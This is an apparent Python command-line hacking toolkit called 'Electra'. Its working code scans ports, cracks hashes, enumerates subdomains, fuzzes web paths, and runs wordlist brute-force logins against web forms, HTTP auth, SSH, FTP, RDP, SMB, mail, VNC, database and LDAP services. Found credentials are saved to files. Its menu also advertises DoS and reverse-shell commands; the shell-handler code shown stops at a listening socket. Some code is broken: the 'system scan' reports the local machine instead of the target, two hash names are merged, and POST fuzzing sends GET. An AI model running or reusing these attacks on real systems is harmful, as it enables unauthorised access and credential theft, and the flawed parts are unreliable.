#!/usr/bin/env python3
#import pymongo.errors
import dns.resolver
import concurrent.futures
import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64
#import telnetlib (Deprecated in python 3.13)
import requests.auth
from smbprotocol.connection import Connection
from smbprotocol.session import Session
import vncdotool.api
from hashid import HashID
from bs4 import BeautifulSoup
from scapy.all import sniff, wrpcap, rdpcap
import urllib.parse

BANNER = """
███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██ ██╔══██╗
█████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.2

Electra - The master plan plotter.
"""

class BannerGroup(click.Group):
    def get_help(self, ctx):
        click.echo(BANNER)
        return super().get_help(ctx)
    
    def format_commands(self, ctx, formatter):
        commands = [
            ("cdir", "Create a new directory in a specified path."),
            ("sscan", "Perform a system scan."),
            ("nscan", "Perform a network scan."),
            ("webpass", "Web Dictionary Password Brute Force Attack."),
            ("webuser", "Web Dictionary Username Brute Force Attack."),
            ("hashgen", "Generate hash of a specific password."),
            ("hashcrk", "Crack a hash or a list of hashes."),
            ("srvatk", "Services Dictionary Password Brute Force attack."),
            ("webatk", "Web (Basic & Digest) Username/Password Brute Force attack."),
            ("subenum", "Subdomain enumeration (Passive & Active)."),
            ("fuzz", "Fuzz directories and files."),
            ("revsh", "Reverse Shell Handler."),
            ("netstr", "Perform DoS/DDoS attack."),
            ("encheck", "Perform service encryption analysis."),
            ("exploit", "Search an exploit."),
            ("passperm", "Perform password permutations."),
            ("codec", "Perform encoding & decoding.")
        ]
        with formatter.section("Commands"):
            for cmd, desc in commands:
                formatter.write_text(f"{cmd:<10} {desc}")
        #return super().format_commands(ctx, formatter)

#HELP COMMAND
@click.group(cls=BannerGroup)
@click.option("-h", "--help", is_flag=True, expose_value=False, is_eager=True, callback=lambda ctx, param, value: click.echo(ctx.get_help()) if value else None, help="Show this help message and exit.")
def cli():
    click.echo(BANNER)

#CDIR COMMAND
@cli.command()
@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
def cdir(name, path):
    #Check whether OS is Linux
    if os.name != "posix":
        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
        return
    
    #Set default path
    if not path:
        path = os.getcwd()
        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
    
    #Construct the full directory path
    full_path = os.path.join(path, name)

    try:
        os.makedirs(full_path, exist_ok=True)
        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
    except PermissionError:
        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
    except FileExistsError:
        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#SSCAN COMMAND
@cli.command()
@click.option("-h", "--hostname", required=True, prompt="Hostname", help="Hostname of the system to scan.")
def sscan(hostname):
    click.echo(click.style(f"[*] Starting system scan for host: {hostname}", fg="blue"))
    try:
        #Resolve IP of the host
        ip = socket.gethostbyname(hostname)
        click.echo(click.style(f"[!] Resolved IP address: {ip}", fg="green"))
        #Perform ping test
        response = os.system(f"ping -c 4 {ip}")
        if response == 0:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is reachable.", fg="green"))
        else:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is not reachable.", fg="red"))
            return
        
        #OS and system info
        click.echo(click.style("\n[*] Gathering OS and System info ...", fg="blue"))
        os_name = platform.system()
        os_version = platform.version()
        architecture = platform.machine()
        click.echo(click.style(f"[!] OS: {os_name}", fg="green"))
        click.echo(click.style(f"[!] OS Version: {os_version}", fg="green"))
        click.echo(click.style(f"[!] Architecture: {architecture}", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        cpu_cores = psutil.cpu_count(logical=False)
        total_mem = psutil.virtual_memory().total // (1024 ** 2)
        click.echo(click.style(f"[!] CPU Cores: {cpu_cores}", fg="green"))
        click.echo(click.style(f"[!] Total Mem: {total_mem} MBs", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #Network info
        for interfaces, addresses in psutil.net_if_addrs().items():
            click.echo(click.style(f"[!] Network Interface: {interfaces}", fg="green"))
            click.echo(click.style(""))
            for address in addresses:
                if address.family == socket.AF_INET:
                    click.echo(click.style(f"[!] IPv4: {address.address}", fg="green"))
                elif address.family == socket.AF_INET6:
                    click.echo(click.style(f"[!] IPv6: {address.address}", fg="green"))
                elif address.family == psutil.AF_LINK:
                    click.echo(click.style(f"[!] MAC: {address.address}", fg="green"))
            click.echo(click.style(""))

        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #AD info (if os == windows)
        if os_name == "Windows":
            try:
                ad_domain = subprocess.check_output("net config workstation", shell=True).decode()
                if "Workstation Domain" in ad_domain:
                    click.echo(click.style("[!] AD Domain detected.", fg="green"))
                else:
                    click.echo(click.style("[!] No AD Domain detected.", fg="red"))
            except Exception as e:
                click.echo(click.style("[!] Could not retrieve AD Domain info.", fg="red"))
        else:
            click.echo(click.style("[!] Host OS is not Windows. No AD Domain detected.", fg="red"))
    
    except socket.gaierror:
        click.echo(click.style(f"[!] Error: Hostname: {hostname} could not be resolved.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#NSCAN COMMAND
@cli.command()
@click.option("-h", "--host", required=True, help="Target IP, Socket or hostname for network scan.")
@click.option("-p", "--port", default="1-1024", help="Port (range) to scan. Default 1-1024.")
@click.option("-t", "--tcp", is_flag=True, help="Perform TCP scan.")
@click.option("-u", "--udp", is_flag=True, help="Perform UDP scan.")
@click.option("-s", "--stealth", is_flag=True, help="Perform a stealth scan. Requires root privileges.")
@click.option("-l", "--loud", is_flag=True, help="Perform a loud scan. (No delays between scans)")
def nscan(host, port, tcp, udp, stealth, loud):
    first_port, last_port = map(int, port.split("-"))
    scan_type = "Stealth" if stealth else "Loud"
    click.echo(click.style(f"[*] Starting {scan_type} network scan on {host} ...", fg="blue"))
    for port in range(first_port, last_port + 1):
        if tcp:
            try:
                socketer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socketer.settimeout(3)
                result = socketer.connect_ex((host, port))
                if result == 0:
                    click.echo(click.style(f"[!] Open TCP port: {port}", fg="green"))
                socketer.close()
            except Exception as e:
                click.echo(click.style(f"[!] TCP scan error on port {port}. {e}", fg="red"))
        if udp:
            try:
                socketer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                socketer.settimeout(3)
                socketer.sendto(b'', (host, port))
                socketer.recvfrom(1024)
                click.echo(click.style(f"[!] Open UDP port: {port}", fg="green"))
            except socket.timeout:
                click.echo(click.style(f"[!] Timeout! Port: {port} may be filtered.", fg="yellow"))
            except Exception as e:
                click.echo(click.style(f"[!] UDP scan error on port {port}. {e}", fg="red"))
            finally:
                socketer.close()
        if not loud:
            time.sleep(0.2) #Delay to reduce loudness
    click.echo(click.style(f"[*] Network scan on {host} completed.", fg="blue"))

#WEBPASS COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", prompt="Username", help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the password wordlist.")
def webpass(url, username, wordlist):
    click.echo(click.style(f"[*] Starting password wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found password: {password}", fg="green"))
                    #Save password to a file
                    with open("Electra-Found-Passwords.txt", "a") as found_passwords:
                        found_passwords.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with password: '{password}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Password Wordlist BF attack completed. No valid passwords found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#WEBUSER COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-p", "--password", prompt="Password", help="Password for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the username wordlist.")
def webuser(url, password, wordlist):
    click.echo(click.style(f"[*] Starting username wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for username in file:
                username = username.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found username: {username}", fg="green"))
                    #Save username to a file
                    with open("Electra-Found-Usernames.txt", "a") as found_usernames:
                        found_usernames.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with username: '{username}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Username Wordlist BF attack completed. No valid usernames found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#HASHGEN COMMAND
@cli.command()
@click.option("-f", "--function", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
@click.option("-p", "--password", required=True, help="Password to hash.")
def hashgen(function, password):
    #Generate hash based on selected func
    click.echo(click.style(f"[*] Generating the hash of: {password} using: {function}.", fg="blue"))
    if function == "md5":
        hashed_pass = hashlib.md5(password.encode()).hexdigest()
    elif function == "sha1":
        hashed_pass = hashlib.sha1(password.encode()).hexdigest()
    elif function == "sha224":
        hashed_pass = hashlib.sha224(password.encode()).hexdigest()
    elif function == "sha256":
        hashed_pass = hashlib.sha256(password.encode()).hexdigest()
    elif function == "sha384":
        hashed_pass = hashlib.sha384(password.encode()).hexdigest()
    elif function == "sha512":
        hashed_pass = hashlib.sha512(password.encode()).hexdigest()
    elif function == "sha3_224":
        hashed_pass = hashlib.sha3_224(password.encode()).hexdigest()
    elif function == "sha3_256":
        hashed_pass = hashlib.sha3_256(password.encode()).hexdigest()
    elif function == "sha3_384":
        hashed_pass = hashlib.sha3_384(password.encode()).hexdigest()
    elif function == "sha3_512":
        hashed_pass = hashlib.sha3_512(password.encode()).hexdigest()
    elif function == "bcrypt":
        salt = bcrypt.gensalt()
        hashed_pass = bcrypt.hashpw(password.encode(), salt).decode()
    
    click.echo(click.style(f"[!] {function.upper()} hash of '{password}' is {hashed_pass}", fg="green"))
    #Save hash to a file
    with open("Electra-Hashed-Passwords.txt", "a") as hashed_passwords:
        hashed_passwords.write(f"{function.upper()} hash: {hashed_pass}, Password: {password}\n")
    click.echo(click.style("[!] Hash successfully saved to Electra-Hashed-Passwords.txt", fg="green"))

#HASHCRK COMMAND
@cli.command()
@click.option("-h", "--hash", help="Hash to crack.")
@click.option("-l", "--hashlist", type=click.Path(exists=True), help="Path to the list of hashes.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to the password wordlist.")
@click.option("-t", "--type", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), help="Hash type. (e.g. MD5, SHA1 etc)")
def hashcrk(hash, hashlist, wordlist, type):
    hashid = HashID()
    hash_targets = []
    if hash:
        hash_targets.append((hash, type or hashid.identifyHash(hash)))
    elif hashlist:
        with open(hashlist, "r") as file:
            for line in file:
                hash_value = line.strip()
                hash_type = type or hashid.identifyHash(hash_value)
                hash_targets.append((hash_value, hash_type))
            #hash_targets = [(line.strip(), type or hashid.identifyHash(line.strip())) for line in file]
    
    with open(wordlist, "r") as file:
        for password in file:
            password = password.strip()
            for h, htype in hash_targets:
                computed_hash = hashlib.new(htype, password.encode()).hexdigest()
                if computed_hash == h:
                    click.echo(click.style(f"[!] Hash: {h} cracked! Password: {password}", fg="green"))
                    break

#SERVATK COMMAND
@cli.command()
@click.option("-s", "--service", type=click.Choice(["ssh", "ftp", "rdp", "smb", "pop3", "imap", "telnet", "vnc", "mysql", "mongodb", "postgresql", "ldap"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
@click.option("-h", "--host", required=True, help="IP, Socket or Hostname of the target.")
@click.option("-u", "--username", required=True, help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
#@click.option("-id", "--guid", default=None, help="Unique session identifier. (For cases where two services are running. e.g. smb)")
def srvatk(service, host, username, wordlist):
    click.echo(click.style(f"[*] Starting {service.upper()} BF attack on {host} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                if service == "ssh":
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        client.connect(host, username=username, password=password, timeout=5)
                        click.echo(click.style(f"[!] Found SSH password of user: {username} is {password}", fg="green"))
                        client.close()
                        #Save ssh password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        return
                    except paramiko.AuthenticationException:
                        click.echo(click.style(f"[!] SSH authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] SSH connection error: {e}", fg="red"))
                elif service == "ftp":
                    try:
                        ftp = ftplib.FTP(host)
                        ftp.login(user=username, passwd=password)
                        click.echo(click.style(f"[!] Found FTP password of user: {username} is {password}", fg="green"))
                        ftp.quit()
                        #Save ftp password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        return
                    except ftplib.error_perm:
                        click.echo(click.style(f"[!] FTP authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] FTP connection error: {e}", fg="red"))
                elif service == "rdp":
                    try:
                        connection = subprocess.run(
                            ["xfreerdp", f"/v:{host}", f"/u:{username}", f"/p:{password}", "/cert-ignore", "/auth-only"], capture_output=True, text=True
                        )
                        #if "Authentication only, exit status 0" in connection.stderr:

                        if connection.returncode == 0:
                            click.echo(click.style(f"[!] Found RDP password of user: {username} is {password}", fg="green"))
                            #Save rdp password to a file
                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                                click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                            return
                        else:
                            click.echo(click.style(f"[!] RDP authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] RDP connection error: {e}", fg="red"))
                elif service == "smb":
                    try:
                        smb_connection = Connection(guid="some-unique-id", username=username, password=password, server=host, port=445) #Thelei tropopoiisi se periptosi pou xrisimopoiithei to option -id
                        smb_connection.connect()
                        smb_session = Session(smb_connection)
                        smb_session.connect()
                        click.echo(click.style(f"[!] Found SMB password of user: {username} is {password}", fg="green"))
                        #Save smb password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Host: {host}, Username: {username}, Password: {password}\n")
                            click.echo(click.style(f"[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        smb_session.disconnect()
                        smb_connection.disconnect()
                        return
                    except Exception as e:
                        click.echo(click.style(f"[!] SMB authentication attempt with {password} failed.", fg="red"))
                elif service == "pop3":
                    try:
                        pop3_connection = poplib.POP3(host)
                        pop3_connection.user(username)
                        pop3_connection.pass_(password)
                        click.echo(click.style(f"[!] Found POP3 password for user: {username} is {password}", fg="green"))
                        pop3_connection.quit()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except poplib.error_proto:
                        click.echo(click.style(f"[!] POP3 authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] POP3 connection error: {e}", fg="red"))
                elif service == "imap":
                    try:
                        imap_connection = imaplib.IMAP4(host)
                        imap_connection.login(username, password)
                        click.echo(click.style(f"[!] Found IMAP password for user: {username} is {password}", fg="green"))
                        imap_connection.logout()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except imaplib.IMAP4.error:
                        click.echo(click.style(f"[!] IMAP authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] IMAP connection error: {e}", fg="red"))
                elif service == "vnc":
                    try:
                        vnc_connection = vncdotool.api.connect(host)
                        vnc_connection.password(password)
                        click.echo(click.style(f"[!] Found VNC password for user: {username} is {password}", fg="green"))
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        vnc_connection.disconnect()
                        return
                    except vncdotool.api.VNCDoException:
                        click.echo(click.style(f"[!] VNC authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] VNC connection error: {e}", fg="red"))
                elif service == "mysql":
                    try:
                        mysql_connection = pymysql.connect(host=host, user=username, password=password)
                        click.echo(click.style(f"[!] Found MySQL password for user: {username} is {password}", fg="green"))
                        mysql_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except pymysql.MySQLError:
                        click.echo(click.style(f"[!] MySQL authentication attempt with {password} failed.", fg="red"))
                elif service == "mongodb":
                    try:
                        mongodb_connection = pymongo.MongoClient(f"mongodb://{username}:{password}@{host}")
                        mongodb_connection.admin.command("ping") #Test connection
                        click.echo(click.style(f"[!] Found MongoDB password for user: {username} is {password}", fg="green"))
                        mongodb_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    #except pymongo.errors.OperationFailure:
                    #    click.echo(click.style(f"[!] MongoDB authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] MongoDB connection error: {e}", fg="red"))
                elif service == "postgresql":
                    try:
                        postgresql_connection = psycopg2.connect(host=host, user=username, password=password)
                        click.echo(click.style(f"[!] Found PostgreSQL password for user: {username} is {password}", fg="green"))
                        postgresql_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except psycopg2.OperationalError:
                        click.echo(click.style(f"[!] PostgreSQL authentication attempt with {password} failed.", fg="red"))
                elif service == "ldap":
                    ldap_server = ldap3.Server(host, get_info=ldap3.NONE)
                    ldap_connection = ldap3.Connection(ldap_server, user=username, password=password)
                    if ldap_connection.bind():
                        click.echo(click.style(f"[!] Found LDAP password for user: {username} is {password}", fg="green"))
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        ldap_connection.unbind()
                        return
                    else:
                        click.echo(click.style(f"[!] LDAP authentication attempt with {password} failed.", fg="red"))
                    ldap_connection.unbind()
                """Commented due to deprecation
                elif service == "telnet":
                    try:
                        telnet_connection = telnetlib.Telnet(host, timeout=5)
                        telnet_connection.read_until(b"login: ")
                        telnet_connection.write(username.encode("ascii") + b"\n")
                        telnet_connection.read_until(b"Password: ")
                        telnet_connection.write(password.encode("ascii") + b"\n")
                        #Check login
                        response = telnet_connection.read_some().decode("ascii")
                        if "incorrect" not in response.lower():
                            click.echo(click.style(f"[!] Found Telnet password for user: {username} is {password}", fg="green"))
                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            telnet_connection.close()
                            return
                        else:
                            click.echo(click.style(f"[!] Telnet authentication attempt with {password} failed.", fg="red"))
                        telnet_connection.close()
                    except EOFError:
                        click.echo(click.style(f"[!] Telnet connection closed unexpectedly.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] Telnet connection error: {e}", fg="red"))
                """

        click.echo(click.style(f"[!] {service.upper()} BF attack completed. No valid passwords found.", fg="magenta"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#WEBATK COMMAND
@cli.command()
@click.option("-u", "--url", required=True, prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", required=False, help="Use a specific username for authentication. If ommited, a username wordlist must be provided.")
@click.option("-uw", "--user-wordlist", type=click.Path(exists=True), help="Path to username wordlist. (For Brute-Forcing usernames)")
@click.option("-pw", "--pass-wordlist", type=click.Path(exists=True), help="Path to password wordlist.")
@click.option("-m", "--auth-method", type=click.Choice(["basic", "digest"], case_sensitive=False), required=True, help="Authentication method (basic or digest).")
def webatk(url, username, user_wordlist, pass_wordlist, auth_method):
    click.echo(click.style(f"[*] Starting {auth_method.upper()} authentication BF attack on: {url}", fg="blue"))
    try:
        usernames = [username] if username else open(user_wordlist).read().splitlines()
        passwords = open(pass_wordlist).read().splitlines()

        for user in usernames:
            for password in passwords:
                auth = requests.auth.HTTPBasicAuth(user, password) if auth_method == "basic" else requests.auth.HTTPDigestAuth(user, password)
                response = requests.get(url, auth=auth)

                if response.status_code == 200:
                    click.echo(click.style(f"[!] Credentials found! Username: {user} Password: {password}", fg="green"))
                    with open("Electra-Found-Web-Passwords.txt", "a") as found_creds:
                        found_creds.write(f"URL: {url}, Username: {user}, Password: {password}, Auth Method: {auth_method.upper()}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Failed authentication attempt with username: {user} and password: {password}", fg="red"))
        click.echo(click.style(f"[!] {auth_method.upper()} HTTP/HTTPS BF attack completed. No valid credentials found.", fg="magenta"))
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Request Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#SUBENUM COMMAND
@cli.command()
@click.option("-d", "--domain", required=True, help="Target domain for subdomain enumeration.")
@click.option("-p", "--passive", is_flag=True, help="Passive subdomain enumeration.")
@click.option("-a", "--active", is_flag=True, help="DNS brute forcing for subdomain enumeration.")
@click.option("-w", "--wordlist", default="subdomains.txt", help="Path to wordlist for brute forcing.")
def subenum(domain, passive, active, wordlist):
    click.echo(click.style(f"[*] Starting subdomain enumeration for: {domain}", fg="blue"))
    results = []
    #Passive enumeration
    if passive:
        click.echo(click.style(f"[*] Executing passive subdomain enumeration...", fg="blue"))
        passive_results = passive_enum(domain)
        click.echo(click.style(f"[!] Passive Subdomain Enumeration results: {passive_results}", fg="green"))
        #Friendly output
        #for sub in passive_results:
        #    click.echo(click.style(f"{sub}", fg="green"))
    
    #DNS BF enumeration
    if active:
        click.echo(click.style(f"[*] Executing DNS Brute Force enumeration...", fg="blue"))
        active_results = active_enum(domain, wordlist)
        click.echo(click.style(f"[!] Active Subdomain Enumeration results: {active_results}", fg="green"))
        #Friendly output
        #for sub, ip in active_results:
        #    click.echo(click.style(f"{sub} on {ip}", fg="green"))
    
    if not passive and not active:
        click.echo(click.style(f"[!] Option -p (passive) or -a (active) is required.", fg="magenta"))
        return
    
    save_results(domain, results)

def passive_enum(domain):
    subdomains = []
    try:
        response = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}")
        if response.status_code == 200:
            subdomains = [line.split(",")[0] for line in response.text.splitlines()]
            click.echo(click.style(f"[!] Found {len(subdomains)} subdomains using passive enumeration.", fg="green"))
        else:
            click.echo(click.style(f"[!] Error: Could not retrieve data from source", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Passive enumeration failed: {e}", fg="red"))
    return subdomains

def active_enum(domain, wordlist):
    subdomains = []
    resolver = dns.resolver.Resolver()
    try:
        with open(wordlist, "r") as file:
            for subdomain in file:
                subd = f"{subdomain.strip()}.{domain}"
                try:
                    results = resolver.resolve(subd, "A")
                    for result in results:
                        subdomains.append((subd, result.to_text()))
                        click.echo(click.style(f"[!] Found subdomain: {subd} on {result.to_text()}", fg="green"))
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
                    continue
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist '{wordlist}' not found", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Active enumeration failed: {e}", fg="red"))
    return subdomains

def save_results(domain, results):
    try:
        with open("Electra-Found-Subdomains.txt", "a") as file:
            file.write(f"Domain: {domain}\n")
            file.write("Subdomain Enumeration Results:")
            for result in results:
                if len(result) == 1:
                    subdomain, enum_type = result
                    file.write(f"{subdomain} (Type: {enum_type})")
                elif len(result) == 2:
                    subdomain, enum_type, ip = result
                    file.write(f"{subdomain} on {ip} (Type: {enum_type})")
        click.echo(click.style(f"[!] Results successfully saved to Electra-Found-Subdomains.txt.", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: Could not save results to file. {e}", fg="red"))

#FUZZ COMMAND
@cli.command()
@click.option("-u", "--url", required=True, help="Target URL to fuzz.")
@click.option("-w", "--wordlist", required=True, type=click.Path(exists=True), help="Wordlist file for attack.")
@click.option("-pw", "--param-wordlist", type=click.Path(exists=True), help="Wordlist for parameter names.")
@click.option("-vw", "--value-wordlist", type=click.Path(exists=True), help="Wordlist for parameter values.")
@click.option("-e", "--extensions", default=None, help="Comma-Nospace-Seperated list of extensions to test. Default = .php,.html,.bak")
@click.option("-c", "--concurrency", default=5, type=int, help="Number of concurrent requests. Default = 5")
@click.option("-m", "--method", default="GET", type=click.Choice(["GET", "POST"], case_sensitive=False), help="HTTP method to use. Default = GET")
@click.option("-s", "--status", default="200", help="Comma-seperated status codes to display. Default = 200")
@click.option("-t", "--timeout", default=5, type=int, help="Timeout for each request in seconds. Default = 5")
def fuzz(url, wordlist, param_wordlist, value_wordlist, extensions, concurrency, method, status, timeout):
    valid_status_codes = [int(code.strip()) for code in status.split(",")]
    extension_list = extensions.split(",") if extensions else [""]
    try:
        with open(wordlist, "r") as file:
            words = [line.strip() for line in file]
        params = []
        values = []
        if param_wordlist:
            with open(param_wordlist, "r") as file:
                params = [line.strip() for line in file]
        if value_wordlist:
            with open(value_wordlist, "r") as file:
                values = [line.strip() for line in file]
    except FileNotFoundError as e:
        click.echo(click.style(f"[!] Wordlist not found. {e}", fg="red"))
        return
    
    def fuzz_path(path):
        for ext in extension_list:
            full_url = f"{url}/{path}{ext}"
            try:
                response = requests.request(method, full_url, timeout=timeout)
                if response.status_code in valid_status_codes:
                    click.echo(click.style(f"[!] Found: {full_url} (Status: {response.status_code})", fg="green"))
            except requests.RequestException:
                click.echo(click.style(f"[!] Error visiting {full_url}", fg="red"))
    
    def fuzz_params():
        for param in params:
            for value in values:
                param_url = f"{url}?"
                param_data = {param: value}
                try:
                    if method.upper() == "GET":
                        response = requests.get(param_url, params=param_data, timeout=timeout)
                    elif method.upper() == "POST":
                        response = requests.get(param_url, params=param_data, timeout=timeout)
                    if response.status_code in valid_status_codes:
                        click.echo(click.style(f"[!] Parameter found: {param}={value} (Status: {response.status_code})", fg="green"))
                except requests.RequestException:
                    click.echo(click.style(f"[!] Error trying with parameter: {param}={value}", fg="red"))
    
    click.echo(click.style(f"[*] Starting fuzzing on {url} with {concurrency} concurrent threads...", fg="blue"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
        executor.map(fuzz_path, words)
        if params and values:
            executor.submit(fuzz_params)
    click.echo(click.style("[*] Fuzzing completed.", fg="blue"))

#REVSH COMMAND
@cli.command()
@click.option("-h", "--host", required=True, help="IP address to listen on for incoming connections.")
@click.option("-p", "--port", required=True, type=int, help="Port number to listen on.")
@click.option("-t", "--type", type=click.Choice(["bash", "python", "powershell"]), required=True, help="Type of reverse shell.")
@click.option("-a", "--arch", type=click.Choice(["x86", "x64"]), default="x64", help="Architecture of the payload. Default = x64")
def revsh(host, port, type, arch):
    click.echo(click.style(f"[*] Setting a {type} reverse shell listener on {host}:{port} for {arch}...", fg="blue"))
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    click.echo(click.style(f"[!] Listening on {host}:{port} ...", fg="green"))
